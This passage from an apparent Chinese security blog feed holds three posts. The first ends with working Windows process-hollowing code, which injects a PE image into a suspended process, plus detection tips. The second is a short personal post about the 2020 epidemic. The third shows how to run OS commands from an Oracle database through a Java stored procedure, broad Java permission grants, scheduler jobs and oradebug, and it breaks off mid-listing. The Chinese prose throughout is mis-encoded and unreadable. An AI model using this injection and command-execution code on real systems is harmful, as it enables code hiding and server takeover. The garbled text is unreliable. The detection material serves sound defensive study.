class="hljs-type">void</span> *)&amp;DosHeader,pBuf,<span class="hljs-built_in">sizeof</span>(IMAGE_DOS_HEADER));<br> ::<span class="hljs-built_in">CopyMemory</span>((<span class="hljs-type">void</span> *)&amp;NtHeader,&amp;pBuf[DosHeader.e_lfanew],<span class="hljs-built_in">sizeof</span>(IMAGE_NT_HEADERS));<br> <span class="hljs-comment">//æ£€æŸ¥PEç»“æ„</span><br> <span class="hljs-comment">//ä»¥æŒ‚èµ·æ–¹å¼è¿›ç¨‹</span><br> BOOL res = <span class="hljs-built_in">CreateProcess</span>(<span class="hljs-literal">NULL</span>,VictimFile,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,FALSE,CREATE_SUSPENDED,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,&amp;si,&amp;pi); <br><br> <span class="hljs-keyword">if</span> (res)<br> &#123;<br>  context.ContextFlags = CONTEXT_FULL;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetThreadContext</span>(pi.hThread,&amp;context))  <span class="hljs-comment">//å¦‚æœè°ƒç”¨å¤±è´¥</span><br>  &#123;<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>   <span class="hljs-keyword">return</span> FALSE;<br>  &#125;<br>  <span class="hljs-built_in">ReadProcessMemory</span>(pi.hProcess,(<span class="hljs-type">void</span> *)(context.Ebx + <span class="hljs-number">8</span>),&amp;BaseAddr,<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>),<span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">if</span> (!BaseAddr)<br>  &#123;<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>   <span class="hljs-keyword">return</span> FALSE;<br>  &#125;<br>  <span class="hljs-comment">//æ‹†å¸å‚€å„¡è¿›ç¨‹å†…å­˜æ¨¡å—</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ZwUnmapViewOfSection</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)pi.hProcess,BaseAddr))<br>  &#123;<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>   <span class="hljs-keyword">return</span> FALSE;<br>  &#125;<br>  ImageBase = <span class="hljs-built_in">VirtualAllocEx</span>(pi.hProcess, <br>   (<span class="hljs-type">void</span> *)NtHeader.OptionalHeader.ImageBase,<br>   NtHeader.OptionalHeader.SizeOfImage, <br>   MEM_RESERVE|MEM_COMMIT, <br>   PAGE_EXECUTE_READWRITE);  <span class="hljs-comment">//ImageBase 0x00400000</span><br>  <span class="hljs-keyword">if</span> (ImageBase == <span class="hljs-literal">NULL</span>)<br>  &#123;<br>   DWORD wrongFlag = <span class="hljs-built_in">GetLastError</span>();<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>   <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>   <span class="hljs-keyword">return</span> FALSE;<br>  &#125;  <br>  <span class="hljs-comment">//æ›¿æ¢å‚€å„¡è¿›ç¨‹å†…å­˜æ•°æ®</span><br>  <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">WriteProcessMemory</span>(pi.hProcess, ImageBase, pBuf, NtHeader.OptionalHeader.SizeOfHeaders, &amp;retByte))<br>  &#123;<br>   DWORD wrongFlag2 = <span class="hljs-built_in">GetLastError</span>();  <br>  &#125;<br>  <span class="hljs-comment">//DOS å¤´ + PE å¤´ + åŒºå—è¡¨çš„æ€»å¤§å°</span><br>  <span class="hljs-comment">//å®šä½åˆ°åŒºå—å¤´</span><br>  offset = DosHeader.e_lfanew + <span class="hljs-built_in">sizeof</span>(IMAGE_NT_HEADERS);<br>  IMAGE_SECTION_HEADER secHeader;<br>  WORD i = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (;i &lt; NtHeader.FileHeader.NumberOfSections;i++)<br>  &#123;<br>   <span class="hljs-comment">//å®šä½åˆ°å„ä¸ªåŒºå—</span><br>   ::<span class="hljs-built_in">CopyMemory</span>((<span class="hljs-type">void</span> *)&amp;secHeader, &amp;pBuf[offset + i*<span class="hljs-built_in">sizeof</span>(IMAGE_SECTION_HEADER)],<span class="hljs-built_in">sizeof</span>(IMAGE_SECTION_HEADER));<br>   <span class="hljs-built_in">WriteProcessMemory</span>(pi.hProcess,(LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress),&amp;pBuf[secHeader.PointerToRawData],secHeader.SizeOfRawData,&amp;retByte);<br>   <span class="hljs-built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress), secHeader.Misc.VirtualSize, PAGE_EXECUTE_READWRITE,&amp;BaseAddr);<br>  &#125;<br> <br>  context.ContextFlags = CONTEXT_FULL;<br>  <span class="hljs-comment">//é‡ç½® æ‰§è¡Œæ–‡ä»¶å…¥å£</span><br>  <span class="hljs-built_in">WriteProcessMemory</span>(pi.hProcess, (<span class="hljs-type">void</span> *)(context.Ebx + <span class="hljs-number">8</span>), <br>   &amp;ImageBase,   <span class="hljs-comment">//4194304</span><br>   <span class="hljs-number">4</span>, &amp;retByte);<br>  context.Eax = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ImageBase + NtHeader.OptionalHeader.AddressOfEntryPoint;<br>  <span class="hljs-built_in">SetThreadContext</span>(pi.hThread,&amp;context);<br>  <span class="hljs-built_in">ResumeThread</span>(pi.hThread);<br> &#125;<br> <br> <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br> <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br> ::<span class="hljs-built_in">CloseHandle</span>(hFile);  <br> <span class="hljs-keyword">delete</span>[] pBuf;<br> <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-æ£€æµ‹æ–¹æ³•"><a href="#2-æ£€æµ‹æ–¹æ³•" class="headerlink" title="2. æ£€æµ‹æ–¹æ³•"></a>2. æ£€æµ‹æ–¹æ³•</h2><ol><li>æ³¨å†Œè¡¨ç›¸å…³æ³¨å…¥ç»§ç»­å¯ä»¥é€šè¿‡Hookå†™æ³¨å†Œè¡¨ç›¸å…³APIå®ç°ç›‘æ§</li><li>SetWindowsHookExåˆ™éœ€è¦æ£€æŸ¥æœ€åä¸€ä¸ªå‚æ•°æ˜¯å¦ä¸º0ï¼Œä¸º0è¡¨ç¤ºå…¨å±€æ³¨å…¥ï¼Œè¿™æ˜¯æˆ‘ä»¬<br>  å…³æ³¨çš„åœ°æ–¹ã€‚ä½†æ˜¯è¾“å…¥æ³•ä¹‹ç±»çš„æ­£å¸¸ç¨‹åºä¹Ÿå¯èƒ½ä½¿ç”¨æ³¨å…¥æŠ€æœ¯ã€‚</li><li>CreateRemoteThreadè¿›ç¨‹æ³¨å…¥æ¯”è¾ƒå¤æ‚ï¼Œæ ¸å¿ƒè¦ç‚¹æ˜¯è¦æœ‰è·¨è¿›ç¨‹å†™å…¥æ•°æ®çš„åŠ¨ä½œï¼Œ<br>  åç»­ä»ä¸¤ä¸ªç»´åº¦æ¥è¿›è¡Œæ£€æŸ¥</li></ol><h3 id="2-1-æ£€æŸ¥è·¨è¿›ç¨‹å†™å…¥çš„æ•°æ®"><a href="#2-1-æ£€æŸ¥è·¨è¿›ç¨‹å†™å…¥çš„æ•°æ®" class="headerlink" title="2.1 æ£€æŸ¥è·¨è¿›ç¨‹å†™å…¥çš„æ•°æ®"></a>2.1 æ£€æŸ¥è·¨è¿›ç¨‹å†™å…¥çš„æ•°æ®</h3><p>è™½ç„¶WriteProcessMemoryçš„åº•å±‚APIç»å¸¸è¢«Windowsåº•å±‚ç”¨ä½œæ•°æ®ä¼ é€’ï¼Œä½†æ˜¯é€šè¿‡<br>ç‰¹å¾å¯ä»¥è¯†åˆ«å‡ºæ¥</p><ol><li>å†™å…¥çš„æ•°æ®æ˜¯PEæ–‡ä»¶</li><li>å†™å…¥çš„æ•°æ®é‡ŒåŒ…å«.dll (ä¸€èˆ¬æ˜¯DLLæ–‡ä»¶åï¼Œæˆ–è€…æ˜¯å¯¼å…¥è¡¨ç›¸å…³æ•°æ®)</li><li>å†™å…¥è¶…é•¿æ•°æ®</li></ol><h3 id="2-2-æ£€æŸ¥çº¿ç¨‹ä»£ç æ‰§è¡Œéƒ¨åˆ†åœ°å€"><a href="#2-2-æ£€æŸ¥çº¿ç¨‹ä»£ç æ‰§è¡Œéƒ¨åˆ†åœ°å€" class="headerlink" title="2.2 æ£€æŸ¥çº¿ç¨‹ä»£ç æ‰§è¡Œéƒ¨åˆ†åœ°å€"></a>2.2 æ£€æŸ¥çº¿ç¨‹ä»£ç æ‰§è¡Œéƒ¨åˆ†åœ°å€</h3><p>æ£€æŸ¥ä»£ç åœ°å€æ˜¯å¦åœ¨WriteProcessMemoryå†™å…¥çš„æ•°æ®åŒºåŸŸä¹‹å†…</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html">Windows DLL Injection Basics</a></li><li><a href="http://blog.csdn.net/evi10r/article/details/6745138">ä½¿ç”¨å¼‚æ­¥è¿‡ç¨‹è°ƒç”¨ï¼ˆAPCï¼‰å®ç°æ¨¡å—æ³¨å…¥</a></li><li><a href="http://bbs.pediy.com/showthread.php?t=99206">Ring3ä¸‹WXæ–¹æ³•ç»“æŸå¾®ç‚¹2009</a></li><li><a href="http://blog.w4kfu.com/tag/duqu">New method of injection</a></li><li><a href="http://www.i7s3curi7y.com/win32-code-injection-techniques">The Ultimate Win32 code injection Reference</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€äº›æ‚è°ˆ</title>
    <link href="/cn/other/"/>
    <url>/cn/other/</url>
    
    <content type="html"><![CDATA[<p>æ•´ä¸ªæ˜¥èŠ‚è¢«æ­¦æ±‰çš„æ–°å‹å† çŠ¶ç—…æ¯’è‚ºç‚æå¾—äººå¿ƒæƒ¶æƒ¶ï¼Œ2020 æ³¨å®šæ˜¯æˆ‘ä»¬è¿™è¾ˆäººéš¾å¿˜çš„ä¸€å¹´ï¼Œéå…¸çš„æ—¶å€™æ¯”è¾ƒå°æ„Ÿè§‰æ²¡é‚£ä¹ˆææ€–ï¼Œç°åœ¨çš„æ„Ÿè§‰å°±å®Œå…¨ä¸ä¸€æ ·äº†ï¼Œæ•´å¤©éƒ½åœ¨æ´—æ‰‹ä¸­åº¦è¿‡ã€‚</p><p>åœ¨ç—…æƒ…æ‰©æ•£æœŸé—´ï¼Œå¤§é‡æ¶ˆæ¯æ»¡å¤©é£ï¼Œç»™æ”¿åºœææ„è§çš„æ›´æ˜¯æ¯”æ¯”çš†æ˜¯ï¼Œä½†æ˜¯å¤§å®¶éƒ½å¿½è§†äº† ä¸€ç‚¹ï¼Œå°±æ˜¯è¦ç›¸ä¿¡ä¸“ä¸šã€‚å¾ˆå¤šäººä¸å¤ªæ˜ç™½ä¸“ä¸šå’Œéä¸“ä¸šä¹‹é—´çš„å·®è·ï¼Œå¯ä»¥æƒ³è±¡ä¸€ä¸‹ä½ å’Œä¸€ ä¸ªå›´æ£‹ä¹æ®µçš„äººä¸‹å›´æ£‹ï¼Œæ€ä¹ˆæ¢åˆ°åŒ»å­¦é¢†åŸŸå¤§å®¶å°±éƒ½æ˜¯ä¸“å®¶äº†ï¼Ÿ</p><p>æˆ‘çœ‹åˆ°ä¸€ä¸ªå»ºè®®è½»å¾ä¸éš”ç¦»ï¼ŒæŠŠèµ„æºè®©ç»™é‡ç—‡è€…ã€‚</p><p>å¤§å®¶è§‰å¾—è¿™ä¸ªå»ºè®®å¦‚ä½•ï¼Ÿæè¿™ä¸ªå»ºè®®çš„äººè¯´ï¼Œä¸»è¦ä¾æ®æ˜¯æ­»äº¡äººä¸å¤šã€‚è¿™ä¸ªçŠ¯äº†å‡ ä¸ªé”™è¯¯ï¼Œ ç¬¬ä¸€ï¼Œè¦çœ‹æ­»äº¡ç‡ï¼Œè€Œä¸æ˜¯æ­»äº¡äººæ•°ï¼Œæ‚£ç—…çš„äººå¤šäº†ï¼Œè‡ªç„¶æ­»äººçš„å°±å¤šäº†ã€‚ç¬¬äºŒï¼Œæ ¹æ®æˆ‘ æœ‰é™çš„å¸¸è¯†ï¼Œç—…æ¯’æ˜¯ä¼šè‡ªé€‚åº”æ€§çš„è¿›åŒ–çš„ï¼Œæ„ŸæŸ“çš„äººå¤šäº†ï¼Œå¯èƒ½å°±ä¼šäº§ç”Ÿæ›´nb çš„å˜ç§äº†ã€‚</p><p>è¿™ä¸ªäº‹æƒ…ä¸»è¦è¿˜æ˜¯ç›¸ä¿¡å›½å®¶ï¼Œç›¸ä¿¡æˆ‘ä»¬çš„ç¥–å›½ã€‚æˆ‘è§‰å¾—è¿™ä¸ªäº‹æƒ…ä¸€å®šä¼šè§£å†³äº†ï¼Œåªæ˜¯æ—¶é—´ å’ŒæŸå¤±ç¨‹åº¦é—®é¢˜ï¼Œä¸€å­£åº¦çš„gdp è‚¯å®šæ˜¯å—å½±å“äº†ï¼Œå¸Œæœ›ç–«æƒ…å¿«ç‚¹è¿‡å»ï¼Œå¤©ä½‘ä¸­åï¼</p><p>æœ€åå¸Œæœ›æ‰€æœ‰çœ‹åˆ°æ­¤æ–‡çš„ï¼Œæ–°å¹´å¹¸ç¦å®‰åº·ï¼</p>]]></content>
    
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Execute os command in Oracle Database</title>
    <link href="/cn/oracle_run_os_cmd/"/>
    <url>/cn/oracle_run_os_cmd/</url>
    
    <content type="html"><![CDATA[<h2 id="1-æ­£ç»Ÿæ–¹æ³•"><a href="#1-æ­£ç»Ÿæ–¹æ³•" class="headerlink" title="1. æ­£ç»Ÿæ–¹æ³•"></a>1. æ­£ç»Ÿæ–¹æ³•</h2><h3 id="1-1-ä½¿ç”¨JAVA"><a href="#1-1-ä½¿ç”¨JAVA" class="headerlink" title="1.1 ä½¿ç”¨JAVA"></a>1.1 ä½¿ç”¨JAVA</h3><h4 id="1-1-1-ä»£ç "><a href="#1-1-1-ä»£ç " class="headerlink" title="1.1.1 ä»£ç "></a>1.1.1 ä»£ç </h4><p>Oracle æ•°æ®åº“éƒ½æ”¯æŒJavaï¼Œå¯ä»¥åˆ©ç”¨javaæ¥å®ç°æˆ‘ä»¬éœ€è¦çš„åŠŸèƒ½ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED <span class="hljs-string">&quot;JAVACMD&quot;</span> AS<br><span class="hljs-keyword">import</span> java.lang.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JAVACMD</span><br>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execCommand</span> <span class="hljs-params">(String command)</span> <span class="hljs-keyword">throws</span> IOException<br> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        String[] finalCommand;<br>        <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="hljs-string">&quot;windows&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>            finalCommand = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">4</span>];<br>            finalCommand[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;C:\\windows\\system32\\cmd.exe&quot;</span>;<br>            finalCommand[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/y&quot;</span>;<br>            finalCommand[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;/c&quot;</span>;<br>            finalCommand[<span class="hljs-number">3</span>] = command;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            finalCommand = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<br>            finalCommand[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>            finalCommand[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;<br>            finalCommand[<span class="hljs-number">2</span>] = command;<br>        &#125;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(finalCommand);<br>        <span class="hljs-keyword">if</span> (p.waitFor() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (p.exitValue() == <span class="hljs-number">1</span>)<br>               System.err.println(<span class="hljs-string">&quot;command execute failed.&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(p.getInputStream());<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">inBr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(in));<br>        String lineStr;<br>        <span class="hljs-keyword">while</span> ((lineStr = inBr.readLine()) != <span class="hljs-literal">null</span>)<br>            System.out.println(lineStr);<br>        inBr.close();<br>        in.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>    &#125; <br> &#125;<br>&#125;;<br>/<br><br>CREATE OR REPLACE PROCEDURE <span class="hljs-title function_">JAVACMDPROC</span> <span class="hljs-params">(p_command IN VARCHAR2)</span><br>AS LANGUAGE JAVA<br>NAME <span class="hljs-string">&#x27;JAVACMD.execCommand (java.lang.String)&#x27;</span>;<br>/<br></code></pre></td></tr></table></figure><h4 id="1-1-2-è®¾ç½®è¾“å‡º"><a href="#1-1-2-è®¾ç½®è¾“å‡º" class="headerlink" title="1.1.2 è®¾ç½®è¾“å‡º"></a>1.1.2 è®¾ç½®è¾“å‡º</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> serveroutput <span class="hljs-keyword">on</span> size <span class="hljs-number">100000</span>;<br><span class="hljs-keyword">exec</span> dbms_java.set_output(<span class="hljs-number">100000</span>);<br></code></pre></td></tr></table></figure><h4 id="1-1-3-éœ€è¦çš„æƒé™"><a href="#1-1-3-éœ€è¦çš„æƒé™" class="headerlink" title="1.1.3 éœ€è¦çš„æƒé™"></a>1.1.3 éœ€è¦çš„æƒé™</h4><p>å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„è¯­å¥æŸ¥è¯¢ç›¸å…³æƒé™</p><ul><li>ç”¨æˆ·æƒé™</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> session_privs;<br></code></pre></td></tr></table></figure><ul><li>JAVA æƒé™</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> dba_java_policy;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> user_java_policy;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨javaä»£ç æ‰§è¡Œç³»ç»Ÿå‘½ä»¤éœ€è¦çš„æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢è¯­å¥è¿›è¡Œæˆæƒï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);<br><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>,<span class="hljs-string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="hljs-string">&#x27;writeFileDescriptor&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>,<span class="hljs-string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="hljs-string">&#x27;readFileDescriptor&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="1-1-4-å®éªŒç»“æœ"><a href="#1-1-4-å®éªŒç»“æœ" class="headerlink" title="1.1.4 å®éªŒç»“æœ"></a>1.1.4 å®éªŒç»“æœ</h4><p>éå¸¸ä¸é”™æ”¯æŒå›æ˜¾ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">exec</span> javacmdproc(<span class="hljs-string">&#x27;/bin/uname -a&#x27;</span>);<br>Linux localhost.localdomain <span class="hljs-number">2.6</span><span class="hljs-number">.32</span><span class="hljs-number">-100.34</span><span class="hljs-number">.1</span>.el6uek.i686 #<span class="hljs-number">1</span> SMP Wed May <span class="hljs-number">25</span><br><span class="hljs-number">17</span>:<span class="hljs-number">28</span>:<span class="hljs-number">36</span> EDT <span class="hljs-number">2011</span> i686 i686 i386 GNU<span class="hljs-operator">/</span>Linux<br><br>PL<span class="hljs-operator">/</span><span class="hljs-keyword">SQL</span> <span class="hljs-keyword">procedure</span> successfully completed.<br></code></pre></td></tr></table></figure><h4 id="1-1-5-æ³¨æ„"><a href="#1-1-5-æ³¨æ„" class="headerlink" title="1.1.5 æ³¨æ„"></a>1.1.5 æ³¨æ„</h4><p>éœ€è¦ä½¿ç”¨å…¨è·¯å¾„</p><h3 id="1-2-DBMS-SCHEDULAR"><a href="#1-2-DBMS-SCHEDULAR" class="headerlink" title="1.2 DBMS_SCHEDULAR"></a>1.2 DBMS_SCHEDULAR</h3><h4 id="1-2-1-DBMS-SCHEDULAR-ç®€ä»‹"><a href="#1-2-1-DBMS-SCHEDULAR-ç®€ä»‹" class="headerlink" title="1.2.1 DBMS_SCHEDULAR ç®€ä»‹"></a>1.2.1 DBMS_SCHEDULAR ç®€ä»‹</h4><p>è¿™ä¸ªå’ŒWindowsä¸Šçš„è®¡åˆ’ä»»åŠ¡ç±»ä¼¼ã€‚</p><h4 id="1-2-2-éœ€è¦çš„æƒé™"><a href="#1-2-2-éœ€è¦çš„æƒé™" class="headerlink" title="1.2.2 éœ€è¦çš„æƒé™"></a>1.2.2 éœ€è¦çš„æƒé™</h4><ol><li>CREATE JOB</li><li>CREATE EXTERNAL JOB</li><li>EXECUTE on dbms_scheduler (granted to public by default)</li></ol><p><code>grant create job, create external job to scott ;</code></p><h4 id="1-2-3-æ‰§è¡Œçš„è¯­å¥"><a href="#1-2-3-æ‰§è¡Œçš„è¯­å¥" class="headerlink" title="1.2.3 æ‰§è¡Œçš„è¯­å¥"></a>1.2.3 æ‰§è¡Œçš„è¯­å¥</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">BEGIN<br>DBMS_SCHEDULER.CREATE_PROGRAM (<br>program_name=&gt; <span class="hljs-string">&#x27;MyCmd&#x27;</span>,<br>program_type=&gt; <span class="hljs-string">&#x27;EXECUTABLE&#x27;</span>,<br>-- Use the ampersand to <span class="hljs-keyword">break</span> <span class="hljs-type">out</span><br><span class="hljs-variable">program_action</span> <span class="hljs-operator">=</span>&gt; <span class="hljs-string">&#x27;/tmp/a.sh&#x27;</span>,<br>enabled=&gt; TRUE,<br>comments=&gt; <span class="hljs-string">&#x27;Run a command using shell metacharacters.&#x27;</span><br> );<br>END;<br>/<br><br>BEGIN<br>DBMS_SCHEDULER.CREATE_JOB (<br>   job_name=&gt; <span class="hljs-string">&#x27;X&#x27;</span>,<br>   program_name=&gt; <span class="hljs-string">&#x27;MyCmd&#x27;</span>,<br>   repeat_interval=&gt; <span class="hljs-string">&#x27;FREQ=SECONDLY;INTERVAL=10&#x27;</span>,<br>   enabled=&gt; TRUE,<br>   comments=&gt; <span class="hljs-string">&#x27;Every 10 seconds&#x27;</span>);<br>END;<br>/<br><br>exec DBMS_SCHEDULER.RUN_JOB ( job_name=&gt; <span class="hljs-string">&#x27;X&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="1-2-4-æ³¨æ„"><a href="#1-2-4-æ³¨æ„" class="headerlink" title="1.2.4 æ³¨æ„"></a>1.2.4 æ³¨æ„</h4><ol><li>åŸå…ˆä½¿ç”¨ || ç­‰ metacharacters çš„bugå·²ç»ä¿®å¤ï¼Œåªèƒ½ä½¿ç”¨å‚æ•°</li><li>Windowsç³»ç»Ÿå¿…é¡»å¼€å¯OracleJobSchedulerSID æœåŠ¡</li><li>Linuxç³»ç»Ÿä¸Šç›¸å…³æ–‡ä»¶çš„æƒé™å¿…é¡»æ­£ç¡®</li><li>é«˜ç‰ˆæœ¬çš„Linuxï¼Œæ‰§è¡Œçš„groupå·²ç»è¢«Oracleå°†ä¸ºnobody</li></ol><p>æ€»ä¹‹è¿™ä¸ªæ–¹æ³•å±€é™è¡Œå¾ˆå¤§ï¼Œä¸æ¨èä½¿ç”¨ï¼Œåˆ—åœ¨è¿™é‡Œåªæ˜¯åšä¸€ä¸ªå¤‡å¿˜ã€‚</p><h3 id="1-3-ä½¿ç”¨oradebug"><a href="#1-3-ä½¿ç”¨oradebug" class="headerlink" title="1.3 ä½¿ç”¨oradebug"></a>1.3 ä½¿ç”¨oradebug</h3><ul><li>oradebug ç®€ä»‹<br>oradebugæ˜¯ä¸€ä¸ªç¥å¥‡çš„å‘½ä»¤, èƒ½å¹²å¾ˆå¤šæ´», ä½†æ˜¯Oracleå´å¾ˆå°‘æåŠï¼Œå±äºundocumented<br>çŠ¶æ€ï¼Œæ˜¯ç»™oracleçš„å·¥ç¨‹å¸ˆä½¿ç”¨çš„ï¼Œä¸»è¦ç”¨äºè°ƒè¯•å’Œæ€§èƒ½è°ƒä¼˜ã€‚å¯ä»¥ä½¿ç”¨ oradebug help<br>å‘½ä»¤ï¼ŒæŸ¥çœ‹oradebugçš„ç”¨æ³•</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 